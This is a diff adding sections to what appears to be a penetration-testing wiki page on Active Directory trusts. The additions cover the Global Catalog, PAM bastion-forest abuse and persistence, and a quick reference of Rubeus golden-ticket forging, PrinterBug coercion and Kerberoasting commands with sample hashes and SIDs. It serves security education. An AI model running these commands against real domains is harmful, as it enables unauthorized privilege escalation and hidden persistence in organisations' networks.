@@ -28,6 +28,16 @@ Simply establishing a trust relationship does not automatically grant access to 
 A trust relationship allows users in one domain to **authenticate** to the other domain's resources, but it does not automatically grant access to them. Access to resources is controlled by permissions, which must be granted explicitly to the user in order for them to access the resources.
 {% endhint %}
 
+### Global Catalog
+The global catalog is a partial copy of all objects in an Active Directory forest, meaning that some object properties (but not all) are contained within it. This data is replicated among all domain controllers marked as global catalogs for the forest. One point of the global catalog is to allow for object searching and deconfliction quickly without the need for referrals to other domains (more information here).
+
+The initial global catalog is generated on the first domain controller created in the first domain in the forest. The first domain controller for each new child domain is also set as a global catalog by default, but others can be added.
+
+The GC allows both users and applications to find information about any objects in ANY domain in the forest. GC is a feature that is enabled on a domain controller and performs the following functions:
+
+Authentication (provided authorization for all groups that a user account belongs to, which is included when an access token is generated)
+Object search (making the directory structure within a forest transparent, allowing a search to be carried out across all domains in a forest by providing just one attribute about an object.)
+
 ### Trust types
 
 The `trustType` attribute of a TDO specifies the type of trust that is established. Here are the different trust types (section [6.1.6.7.15 "trustType"](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/36565693-b5e4-4f37-b0a8-c1b12138e18e) of \[MS-ADTS]):
@@ -197,6 +207,83 @@ The trusted domain's DC does the usual checks and passes the result to the trust
 When doing NTLM authentications across trusts, the trusting domain's domain controller checks a few things from the user info structure supplied by the trusted domain controller: [SID filtering](trusts.md#sid-filtering) (looking in the `ExtraSids` attribute from the [`NETLOGON_VALIDATION_SAM_INFO2`](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-nrpc/2a12e289-7904-4ecb-9d83-6732200230c0) structure), and [Selective Authentication](trusts.md#authentication-level) limitation during the [DC's validation of the user credentials](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-apds/f47e40e1-b9ca-47e2-b139-15a1e96b0e72). [TGT delegation](trusts.md#tgt-delegation) verification doesn't occur here, since it's a Kerberos mechanism.
 
 _Nota bene, wether it's Kerberos or NTLM, the ExtraSids are in the same data structure, it's just named differently for each protocol. And, the SID filtering function called by the trusting DC is the same, for both authentication protocols._
+
+## Bastion/Red Forests
+Microsoft introduced Privileged Access Management (PAM) with Server 2016. Among other things, it has very interesting features like -
+    - A bastion forest (Think the administrative forest in ESAE or the famous Red Forest)
+    - Shadow security principals
+    - Temporary group membership (Add a user to a group with time-to-live (TTL))
+### Overview
+PAM has been discussed in much detail [here by Russel](https://www.petri.com/windows-server-2016-set-privileged-access-management) and [here by Willem](https://blogs.technet.microsoft.com/389thoughts/2017/06/19/ad-2016-pam-trust-how-it-works-and-safety-advisory/). A quick explanation is below:
+1. In a perfect world, PAM enables managing an existing production/user forest using a bastion forest which has a one-way PAM trust with the existing forest. The users in the bastion forest can be 'mapped' to privileges groups like Domain Admins and Enterprise Admins in the user forest without modifying any group memberships or ACLs. This is done by creating Shadow security principals in the bastion forest, which are mapped to SIDs for high privilege groups in the user forest and then add users from the admin forest as members of the shadow security principals.
+2. Shadow Principals reside in a special container 'CN=Shadow Principal Configuration,CN=Services' under the Configuration container on bastion forest.
+3. Now, it is possible to manage powershell.local forest from bastion.local without making any changes in the group memberships or ACLs on powershell.local. This takes away administrative overhead of managing groups and ACLs and reduces chances of lateral movement techniques like OverPTH, PTT and other credential relay techniques.
+4. There is something worth noticing about the above setup. To be able to use the shadow security principals, we had to allow SIDHistory in the PAM trust which means no SID Filtering.
+5. A PAM trust where you do not have an isolated bastion forest is disastrous. Why? Because in such a case if we compromise the bastion forest we get high privileges (Enterprise Admins or Domain Admins) in the other forest:
+    - There is no group membership (unlike Foreign Security Principals)
+    - No ACLs modification
+    - No other modification to look for in the forest which gets compromised!
+### Enumeration
+1. Using the ADModule, we can simply run Get-ADTrust and look for a trust which has ForestTransitive set to True and SIDFilteringQuarantined set to False - this means that SID Filtering is disabled. `Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}`
+2. If you want to enumerate if your current forest is managed by a bastion forest (Blue Teams take note), look for ForestTransitive set to True and SIDFilteringForestAware set to True. In this case, TrustAttributes is also a very good indicator. It is `0x00000400` (`1024` in decimal) for PAM/PIM trust. Simplifying it, it is `1096` for PAM + External Trust + Forest Transitive.
+3. To enumerate the shadow security principals, its members from the current (bastion) forest and privileges in the user/production forest, we can use the following command from the ActiveDirectory module: `Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl`
+The following properties are the most interesting ones:
+- Name - Name of the shadow principal
+- member - Members from the bastion forest which are mapped to the shadow principal. In our example, it is the Domain Administrator of defensiveps.local.
+- msDS-ShadowPrincipalSid - The SID of the principal (user or group) in the user/prodcution forest whose privileges are assgined to the shadow security principal. In our example, it is the Enterpise Admins group in the user forest.
+### Abusing the shadow principals
+1. If we compromise the user listed in "member" above we can use the shadow principals. With the privileges achieved using shadow principals above, we can access the user forest using RDP (explicit credentials of the bastion user required), WMI, PowerShell Remoting etc. Please note that if Kerberos AES Encryption is not enabled for the PAM trust, we need to add the machines of existing forest in WSMan TrustedHosts and use -Authentication Negotiate option with PowerShell remoting cmdlets.
+Please note that we can also use SIDHistory injection using Mimikatz to abuse the PAM trust.
+### Persistence
+We can also use this for persistence. Please note that the persistence will be for the privileges on the user/production forest and not the bastion forest itself. Once we have compromised the bastion forest, there are multiple ways we can use:
+1. We can add a user to an existing shadow security principal container. Set-ADObject -Identity "CN=psforest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=defensiveps,DC=local" -Add @{'member'="CN=lowpriv user,CN=Users,DC=defensiveps,DC=local"} -Verbose
+Please note that in this case, if someone looks at the details of the 'lowprivuser', he/she would appear to be a part of the psforest-ShadowEnterpriseAdmin 'group'.
+2. Better, we can modify the ACL of the shadow principal object. We can provide a user we control, Full Permission overt shadow principal object but the fun is always with minimal permissions. So, with only Read Members and Write Members permissions on the shadow principal object, we can add and remove principals at will from the shadow principals. Now, we can add or remove users at will with the privileges of 'reportdbadmin' user. On top of that, by-default there are no logs for any changes to the ACL or 'membership' of a shadow principal.
+
+## Trust Attack High-Level Strategy
+1. The first step is to enumerate all trusts your current domain has, along with any trusts those domains have, and so on. Basically, we want to produce a mapping of all the domains we can reach from your current context through the linking of trust referrals. This will allow us to determine the domains we need to hop through to get to our target and what techniques we can execute to achieve this. Any domains in the mapped “mesh” that are in the same forest (e.g. parent->child relationships) are of particular interest due to the `SIDhistory-trust-hopping` technique.
+2. The next step is to enumerate any users/groups/computers (security principals) in one domain that either (1) have access to resources in another domain (i.e. membership in local administrator groups, or DACL ACE entries), or (2) are in groups or (if a group) have users from another domain. The point here is to find relationships that cross the mapped trust boundaries in some way and therefore might provide a type of “access bridge” from one domain to another in the mesh. While a cross-domain nested relationship is not guaranteed to facilitate access, trusts are normally implemented for a reason, meaning more often than not some type of cross-domain user/group/resource “nesting” probably exists, and in many organizations these relationships are misconfigured. Kerberoasting across trusts may be another vector to hop a trust boundary.
+3. When we have mapped out the trust mesh, types, and cross-domain nested relationships, we have a map of what accounts you need to compromise to pivot from our current domain into our target.
+4. At a minimum, remember that if a domain trusts us, i.e. if the trust is bidirectional or if one-way and inbound, then we can query any Active Directory information from the trusting domain. And remember that all parent->child (intra-forest domain trusts) retain an implicit two-way transitive trust with each other. Also, due to how child domains are added, the “Enterprise Admins” group is automatically added to Administrators domain local group in each domain in the forest. This means that trust “flows down” from the forest root, making it our objective to move from child to forest root at any appropriate step in the attack chain.
+
+## Trust Attack Quick Reference Guide
+### Intra-Forest Cross-Domain Trust Abuse (Different Domains inside the Same Forest)
+_Do we have DA privileges on a domain INSIDE the forest?_
+1. YES -> we can elevate our privileges to EA using the following methods:
+1.1 Abusing Parent-Child Trust Relationship to forge an Inter-Realm Golden Ticket. We need the krbtgt credentials of the compromised domain. `.\Rubeus.exe golden /rc4:b0975ae49f441adc6b024ad238935af5 /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /user:Administrator /ptt /nowrap`
+1.2 Abusing the Trust Keys to forge an Inter-Realm Golden Ticket. We need the `targetdomain$` credentials of the compromised domain. `.\Rubeus.exe golden /rc4:86d1ec8e8407e8065b6b49e27230e90f /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /user:Administrator /service:krbtgt /target:techcorp.local /nowrap`
+1.3 Abusing the KUD of the compromised domain's DC (or other machine with similar privileges) and coercing the target domain's DC to authenticate to it using PrinterBug to steal the TGT of the target DC's machine account.
+Monitor for tickets at the compromised DC: `.\Rubeus.exe monitor /interval:5 /targetuser:techcorp-dc$ /nowrap`
+Coerce the target DC to authenticate to the compromised DC: `.\MS-RPRN.exe \\techcorp-dc.techcorp.local \\us-dc.us.techcorp.local`
+2. NO
+2.1 Use Get-DomainForeignUser to find whether any user from our domain has access into other groups in the forest.
+2.2 Use Get-DomainForeignGroupMember -Domain OTHER.DOMAIN to see if groups in those other forest domains had “incoming” access.
+2.3 Kerberoasting `.\Rubeus kerberoast /domain:eu.local /nowrap`
+
+### Inter-Forest Cross-Domain Attack (Different Domains in Different Forests)
+#### Bidirectional Inter-Forest Cross-Domain Attack (FOREST_TRANSITIVE, Bidirectional)
+In that specific case, THE FOREST IS NOT A SECURITY BOUNDARY.
+We may be able to abuse the KUD of the compromised domain's DC (or other machine with similar privileges) and coercing the target domain's DC to authenticate to it using PrinterBug to steal the TGT of the target DC's machine account.
+- Monitor for tickets at the compromised DC: `.\Rubeus.exe monitor /interval:5 /targetuser:usvendor-dc$ /nowrap`
+- Coerce the target DC to authenticate to the compromised DC: `.\MS-RPRN.exe \\usvendor-dc.usvendor.local \\techcorp-dc.techcorp.local`
+#### Bidirectional Inter-Forest Cross-Domain Attack with Fully Implemented SID Filtering (FILTER_SIDS, Bidirectional)
+1. Enumerate for Local Group Membership on individual servers.
+2. Enumerate for Foreign Security Principals on the target domain: `Get-DomainForeignGroupMember -Domain OTHER.DOMAIN`
+3. Enumerate for Foreign ACL Principals: `Find-InterestingDomainAcl -Domain OTHER.DOMAIN -ResolveGUIDs`
+4. Kerberoasting `.\Rubeus kerberoast /domain:eu.local /nowrap`
+#### One-Way Inter-Forest Cross-Domain Attack (FOREST_TRANSITIVE, Inbound)
+1. Enumerate for Local Group Membership on individual servers.
+2. Enumerate for Foreign Security Principals on the target domain: `Get-DomainForeignGroupMember -Domain OTHER.DOMAIN`
+3. Enumerate for Foreign ACL Principals: `Find-InterestingDomainAcl -Domain OTHER.DOMAIN -ResolveGUIDs`
+4. Kerberoasting `.\Rubeus kerberoast /domain:eu.local /nowrap`
+#### Bidirectional External Cross-Domain Attack with SID Filtering (TREAT_AS_EXTERNAL,FOREST_TRANSITIVE, Bidirectional)
+1. Enumerate for Local Group Membership on individual servers.
+2. Enumerate for Foreign Security Principals on the target domain: `Get-DomainForeignGroupMember -Domain OTHER.DOMAIN`
+3. Enumerate for Foreign ACL Principals: `Find-InterestingDomainAcl -Domain OTHER.DOMAIN -ResolveGUIDs`
+4. Kerberoasting `.\Rubeus kerberoast /domain:eu.local /nowrap`
+5. Find Interesting Domain Groups with SID-extention>1000 that could be used for SID History injection, in order to obtain the privileges of that group on the target domain. In order to abuse that, we will need the `targetdomain$` credentials of the compromised domain. `.\Rubeus.exe golden /rc4:629b1eaa7ec6cfe2f4943a853ad6b36b /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /user:Administrator /service:krbtgt /target:euvendor.local /nowrap`
+#### Bastion Forests
+Look for a way to compromise the Bastion (Red) forest in order to easily gain access over all the managed Production forests.
 
 ## Practice
 
